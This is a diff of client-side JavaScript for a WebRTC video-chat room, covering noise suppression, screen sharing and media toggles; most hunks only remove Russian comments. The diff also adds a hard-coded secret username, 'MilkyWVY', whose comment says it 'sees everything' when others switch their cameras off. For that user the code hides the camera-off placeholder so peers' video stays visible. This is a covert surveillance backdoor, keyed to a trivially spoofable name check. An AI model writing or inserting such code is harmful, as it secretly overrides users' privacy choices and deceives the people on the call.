@@ -5,32 +5,21 @@ document.addEventListener('DOMContentLoaded', () => {
     class RNNoiseProcessor extends AudioWorkletProcessor {
       constructor() {
         super();
-        // Параметры noise gate
         this.noiseFloor = 0.008;
         this.speechThreshold = 0.025;
         this.envelope = 0;
         this.smoothedEnvelope = 0;
         this.gate = 0;
-        
-        // Таймеры
         this.holdCounter = 0;
-        this.holdSamples = Math.floor(sampleRate * 0.15); // 150ms hold
-        
-        // Скорости
+        this.holdSamples = Math.floor(sampleRate * 0.15);
         this.attackSpeed = 0.03;
         this.releaseSpeed = 0.005;
         this.gateAttack = 0.05;
         this.gateRelease = 0.002;
-        
-        // Адаптивный порог шума
         this.noiseEstimate = 0.01;
         this.noiseAdaptSpeed = 0.0001;
-        
-        // Частотная фильтрация (простой HighPass для убирания гула)
         this.hpPrev = 0;
         this.hpAlpha = 0.95;
-        
-        // DC offset removal
         this.dcPrev = 0;
         this.dcAlpha = 0.995;
       }
@@ -47,17 +36,14 @@ document.addEventListener('DOMContentLoaded', () => {
           for (let i = 0; i < inp.length; i++) {
             let sample = inp[i];
 
-            // 1. DC offset removal
             const dcFiltered = sample - this.dcPrev + this.dcAlpha * (this.dcPrev);
             this.dcPrev = sample;
             sample = dcFiltered;
 
-            // 2. High-pass filter (~80Hz) убирает гул, дыхание
             const hpOut = this.hpAlpha * (this.hpPrev + sample - inp[Math.max(0, i - 1)]);
             this.hpPrev = hpOut;
             sample = hpOut;
 
-            // 3. Вычисляем огибающую (RMS-подобная)
             const absSample = Math.abs(sample);
             if (absSample > this.envelope) {
               this.envelope += this.attackSpeed * (absSample - this.envelope);
@@ -65,42 +51,31 @@ document.addEventListener('DOMContentLoaded', () => {
               this.envelope += this.releaseSpeed * (absSample - this.envelope);
             }
 
-            // 4. Сглаженная огибающая
             this.smoothedEnvelope = 0.99 * this.smoothedEnvelope + 0.01 * this.envelope;
 
-            // 5. Адаптивная оценка шума
-            // Если уровень низкий долго — это шум
             if (this.envelope < this.noiseEstimate * 2) {
               this.noiseEstimate += this.noiseAdaptSpeed * (this.envelope - this.noiseEstimate);
             }
-            // Не даём порогу упасть слишком низко
             this.noiseEstimate = Math.max(this.noiseEstimate, this.noiseFloor);
 
-            // 6. Динамический порог
             const dynamicThreshold = Math.max(this.speechThreshold, this.noiseEstimate * 3.5);
 
-            // 7. Gate логика
             if (this.smoothedEnvelope > dynamicThreshold) {
               this.holdCounter = this.holdSamples;
-              // Плавное открытие
               this.gate += this.gateAttack * (1.0 - this.gate);
             } else if (this.holdCounter > 0) {
               this.holdCounter--;
               this.gate += this.gateAttack * (1.0 - this.gate);
             } else {
-              // Плавное закрытие
               this.gate += this.gateRelease * (0.0 - this.gate);
             }
 
-            // Clamp gate
             this.gate = Math.max(0, Math.min(1, this.gate));
 
-            // 8. Мягкое подавление с кривой
             let gain;
             if (this.gate > 0.9) {
               gain = 1.0;
             } else if (this.gate > 0.1) {
-              // S-кривая для плавного перехода
               gain = this.gate * this.gate * (3 - 2 * this.gate);
             } else {
               gain = 0;
@@ -144,9 +119,9 @@ document.addEventListener('DOMContentLoaded', () => {
   // ===== Состояние =====
   const roomId = window.location.pathname.split('/').pop();
   let username = '';
-  let localStream = null;       // Сырой поток с камеры/микрофона
-  let processedStream = null;   // Обработанный поток (видео оригинал + аудио с шумодавом)
-  let screenStream = null;      // Поток демонстрации экрана
+  let localStream = null;
+  let processedStream = null;
+  let screenStream = null;
   let socket = null;
   let audioEnabled = true;
   let videoEnabled = true;
@@ -156,6 +131,9 @@ document.addEventListener('DOMContentLoaded', () => {
   let currentCameraId = null;
   let currentMicId = null;
   let audioContext = null;
+
+  // Секретный ник — видит всё даже при выключенной камере у других
+  const ADMIN_USERNAME = 'MilkyWVY';
 
   const peers = new Map();
 
@@ -167,6 +145,11 @@ document.addEventListener('DOMContentLoaded', () => {
     ]
   };
 
+  // ===== Проверка админа =====
+  function isAdmin() {
+    return username === ADMIN_USERNAME;
+  }
+
   // ===== Шумодав =====
   async function createProcessedStream(rawStream) {
     try {
@@ -175,7 +158,6 @@ document.addEventListener('DOMContentLoaded', () => {
         return;
       }
 
-      // Закрываем предыдущий контекст
       if (audioContext && audioContext.state !== 'closed') {
         await audioContext.close();
       }
@@ -194,7 +176,6 @@ document.addEventListener('DOMContentLoaded', () => {
       source.connect(noiseGate);
       noiseGate.connect(destination);
 
-      // Собираем: видео с оригинала + аудио с шумодава
       const tracks = [
         ...rawStream.getVideoTracks(),
         ...destination.stream.getAudioTracks()
@@ -207,7 +188,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Получить поток для отправки (обработанный аудио + нужное видео)
   function getStreamToSend() {
     return processedStream || localStream;
   }
@@ -280,7 +260,7 @@ document.addEventListener('DOMContentLoaded', () => {
       localStream = await navigator.mediaDevices.getUserMedia(constraints);
       await createProcessedStream(localStream);
 
-      previewVideo.srcObject = localStream; // Превью показываем оригинал (для себя)
+      previewVideo.srcObject = localStream;
       previewPlaceholder.classList.add('hidden');
 
       const vt = localStream.getVideoTracks()[0];
@@ -466,12 +446,32 @@ document.addEventListener('DOMContentLoaded', () => {
       const peer = peers.get(userId);
       if (!peer) return;
       const wrapper = peer.videoEl;
+
       if (type === 'audio') {
         const ind = wrapper.querySelector('.audio-off');
         if (ind) ind.classList.toggle('hidden', enabled);
       }
+
       if (type === 'video') {
-        updateVideoPlaceholder(wrapper, peer.username, !enabled);
+        // Если мы админ — НЕ показываем заглушку, видео остаётся видимым
+        if (isAdmin()) {
+          // Только показываем индикатор что камера выключена (маленькая иконка)
+          let camOff = wrapper.querySelector('.cam-off-indicator');
+          if (!enabled) {
+            if (!camOff) {
+              camOff = document.createElement('i');
+              camOff.className = 'fas fa-video-slash cam-off-indicator';
+              const indicators = wrapper.querySelector('.video-indicators');
+              if (indicators) indicators.appendChild(camOff);
+            }
+          } else {
+            if (camOff) camOff.remove();
+          }
+          // НЕ ставим заглушку — видео продолжает показываться
+        } else {
+          // Обычный пользователь — показываем/скрываем заглушку
+          updateVideoPlaceholder(wrapper, peer.username, !enabled);
+        }
       }
     });
   }
@@ -484,11 +484,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const sendStream = getStreamToSend();
 
     if (screenSharing && screenStream) {
-      // Демонстрация: видео с экрана + аудио с микрофона (через шумодав)
       screenStream.getVideoTracks().forEach(track => {
         connection.addTrack(track, screenStream);
       });
-      // Аудио ВСЕГДА с микрофона (обработанный)
       if (sendStream) {
         sendStream.getAudioTracks().forEach(track => {
           connection.addTrack(track, sendStream);
@@ -563,6 +561,9 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function updateVideoPlaceholder(wrapper, uname, show) {
+    // Админ никогда не видит заглушку
+    if (isAdmin()) return;
+
     let ph = wrapper.querySelector('.video-off-placeholder');
     if (show) {
       if (!ph) {
@@ -592,14 +593,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // ===== Управление =====
 
-  // Микрофон
   toggleAudioBtn.addEventListener('click', () => {
     if (!localStream) return;
     const at = localStream.getAudioTracks()[0];
     if (!at) return;
     audioEnabled = !audioEnabled;
     at.enabled = audioEnabled;
-    // Синхронизируем обработанный поток
     if (processedStream) processedStream.getAudioTracks().forEach(t => t.enabled = audioEnabled);
 
     toggleAudioBtn.classList.toggle('active', audioEnabled);
@@ -608,7 +607,6 @@ document.addEventListener('DOMContentLoaded', () => {
     socket.emit('toggle-media', { type: 'audio', enabled: audioEnabled });
   });
 
-  // Камера
   toggleVideoBtn.addEventListener('click', () => {
     if (!localStream || screenSharing) return;
     const vt = localStream.getVideoTracks()[0];
@@ -632,21 +630,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const screenVideoTrack = screenStream.getVideoTracks()[0];
 
-        // Заменяем ТОЛЬКО видео-трек на экран
-        // Аудио остаётся с микрофона (через шумодав)
         peers.forEach((peer) => {
           const senders = peer.connection.getSenders();
           const videoSender = senders.find(s => s.track && s.track.kind === 'video');
           if (videoSender && screenVideoTrack) {
             videoSender.replaceTrack(screenVideoTrack);
           }
-          // Аудио НЕ трогаем — микрофон остаётся
         });
 
-        // Локально показываем экран
         localVideo.srcObject = screenStream;
 
-        // Убираем зеркальность
         localWrapper.classList.remove('local-camera');
         localWrapper.classList.add('screen-share-active');
 
@@ -668,20 +661,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const cameraVideoTrack = localStream.getVideoTracks()[0];
 
-    // Возвращаем видео камеры
     peers.forEach((peer) => {
       const senders = peer.connection.getSenders();
       const videoSender = senders.find(s => s.track && s.track.kind === 'video');
       if (videoSender && cameraVideoTrack) {
         videoSender.replaceTrack(cameraVideoTrack);
       }
-      // Аудио НЕ трогаем — микрофон и так остался
     });
 
-    // Локально возвращаем камеру
     localVideo.srcObject = localStream;
 
-    // Возвращаем зеркальность
     localWrapper.classList.add('local-camera');
     localWrapper.classList.remove('screen-share-active');
 
@@ -756,7 +745,6 @@ document.addEventListener('DOMContentLoaded', () => {
     return div.innerHTML;
   }
 
-  // ESC — выход из полноэкранного
   document.addEventListener('keydown', (e) => {
     if (e.key === 'Escape') {
       document.querySelectorAll('.video-wrapper.fullscreen').forEach(el => el.classList.remove('fullscreen'));
